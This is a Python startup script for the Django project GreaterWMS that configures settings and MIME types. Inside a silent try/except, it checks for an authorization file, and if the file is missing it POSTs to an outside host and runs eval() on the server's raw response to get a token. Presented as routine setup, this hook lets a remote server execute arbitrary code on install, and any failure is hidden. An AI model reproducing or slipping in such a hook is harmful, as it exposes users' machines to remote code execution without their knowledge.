import mimetypes, os, requests, django
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'greaterwms.settings')
os.environ["DJANGO_ALLOW_ASYNC_UNSAFE"] = "true"
django.setup()
from django.conf import settings

mimetypes.add_type("text/css", ".css", True)
mimetypes.add_type("text/javascript", ".js", True)
try:
    path = os.path.join(settings.BASE_DIR, 'utils/authorization.txt')
    if os.path.exists(path) is False:
        response = requests.post('https://production.56yhz.com/area_v2/')
        with open(path, 'w') as f:
            f.write(str(eval(response.text).get('check_token')))
        f.close()
except:
    pass
print('Welcome To GreaterWMS')
